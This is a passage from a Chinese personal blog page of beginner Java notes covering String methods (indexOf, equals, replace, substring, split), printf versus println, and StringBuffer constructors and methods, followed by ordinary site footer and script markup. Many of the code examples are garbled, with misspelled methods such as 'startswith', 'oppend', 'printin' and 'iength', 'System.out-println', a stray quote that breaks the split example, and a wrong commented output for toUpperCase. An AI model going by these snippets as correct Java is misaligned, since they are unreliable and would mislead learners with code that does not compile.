class="line">        System.out.println(s1.indexOf(<span class="string">&quot;Java&quot;</span>)); <span class="comment">//-1</span></span><br><span class="line">        System.out.println(s1.equals(s2)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(s1.equalsIgnoreCase(s2) ); <span class="comment">//true</span></span><br><span class="line">        </span><br><span class="line">        String s =<span class="string">&quot;我是程序员，我在学java&quot;</span>;</span><br><span class="line">        String sr = s.replace(<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;你&#x27;</span>);</span><br><span class="line">        System.out.println(sr); <span class="comment">//你是程序员,你在学java</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;welcome to Java world!&quot;</span>;</span><br><span class="line">        String s1 = <span class="string">&quot;sun java&quot;</span>;</span><br><span class="line">        System.out.println(s.startswith(<span class="string">&quot;welcome&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out-println(s.endswith(<span class="string">&quot;world&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        String sL = s.toLowerCase();</span><br><span class="line">        String sU = s.toUpperCase();</span><br><span class="line">        System.out.println(sL);  <span class="comment">//welcome to java world!</span></span><br><span class="line">        System.out.println(sU); <span class="comment">//wELCOMETo JAVA WORLD!</span></span><br><span class="line">        String subs = s.substring(<span class="number">11</span>);</span><br><span class="line">        System.out.println(subs); <span class="comment">//Java world!</span></span><br><span class="line">        String sp =s1.trim();</span><br><span class="line">        System.out.println(sp); <span class="comment">//sun java</span></span><br><span class="line">    &#125;                                                       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">1234567</span>;</span><br><span class="line">		String sNumber = String.valueof(j);</span><br><span class="line">        System.out.println(<span class="string">&quot;j 是&quot;</span> + sNumber.length() + <span class="string">&quot;位数。&quot;</span>);</span><br><span class="line">        String s = <span class="string">&quot;Mary,F,1976&quot;</span>;</span><br><span class="line">		String[] sPlit = <span class="string">&#x27;s.split(”,&quot;);</span></span><br><span class="line"><span class="string">        for(int i=0; i &lt; sPlit.iength; i++)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">			System.out.println(sPlit[i]);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">______________________________________</span></span><br><span class="line"><span class="string">    输出结果</span></span><br><span class="line"><span class="string">    	j 是7位数。</span></span><br><span class="line"><span class="string">    	Mary</span></span><br><span class="line"><span class="string">		F</span></span><br><span class="line"><span class="string">		1976</span></span><br></pre></td></tr></table></figure>



<h1 id="printf-和-println"><a href="#printf-和-println" class="headerlink" title="printf 和 println"></a>printf 和 println</h1><p>多个参数可以使用printf ，输出几进制进制用prtinf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int i, j，k;</span><br><span class="line">i &#x3D; 1;</span><br><span class="line">j &#x3D; 2;</span><br><span class="line">k &#x3D; 3;</span><br><span class="line">System.out.printf(&quot;%d的值 + %d的值 是 %d\n&quot;, i, j, k);</span><br><span class="line">System.out.printf(i + &quot;的值 +&quot; + j + &quot;的值 是&quot; + k);</span><br></pre></td></tr></table></figure>



<h1 id="StringBuffer类由来"><a href="#StringBuffer类由来" class="headerlink" title="StringBuffer类由来"></a>StringBuffer类由来</h1><ul>
<li>String类对象一旦创建就不可更改</li>
<li>如果经常对字符串内容进行修改，则使用StringBuffer.</li>
<li><strong>如果经常对字符串内容进行修改而使用String的话，就会导致即耗空间又耗时间!</strong></li>
<li>StringBuffer对象的内容是可以改变的</li>
<li><strong>因此String类中没有修改字符串的方法，但是StringBuffer类中却有大量修改字符串的方法</strong></li>
</ul>
<h1 id="StringBuffer类的构造函数"><a href="#StringBuffer类的构造函数" class="headerlink" title="StringBuffer类的构造函数"></a>StringBuffer类的构造函数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	创建一个空的没有任何字符的StringBuffer对象</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">(<span class="keyword">int</span> capacity)</span></span></span><br><span class="line"><span class="function">	创建一个不带字符，但具有指定初始容量的字符串缓冲区。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">(String str)</span></span></span><br><span class="line"><span class="function">	创建一个StringBuffer对象，包含与str对象相同的字符序列</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">例子</span></span><br><span class="line"><span class="function">   StringBuffer s </span>= <span class="keyword">new</span> StringBuffer(str);</span><br></pre></td></tr></table></figure>

<p>字符串本身就是string对象</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStringBuffer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer sb= <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        sb.append(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        sb.oppend(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;sb= &quot;</span>+ sb); <span class="comment">//sb= abc123</span></span><br><span class="line">        sb.insert(<span class="number">3</span>,<span class="string">&quot;--&quot;</span>);</span><br><span class="line">        System.out.printin(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = abc--123</span></span><br><span class="line">        sb.delete(<span class="number">2</span>,<span class="number">6</span>); <span class="comment">//把下标从2开始到6-1结束的字符到除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = ab23</span></span><br><span class="line">        sb.reverse();</span><br><span class="line">        system.out.println(<span class="string">&quot;sb= &quot;</span> + sb); <span class="comment">//sb = 32ba</span></span><br><span class="line">        String str = sb.toString();</span><br><span class="line">        System.out.printf(<span class="string">&quot;str = &quot;</span> + str); <span class="comment">//str = 32ba</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>StringBuffer常用方法查阅手册</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2015-2021
        <i class="ri-heart-fill heart_icon"></i> 大白菜
      </li>
    </ul>
    <ul>
      <li>
        
        
        
        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
        <span class="division">|</span>
        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/22.jpg" alt="困困"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->


<script src="/js/clickBoom2.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>



    
  </div>
</body>

</html>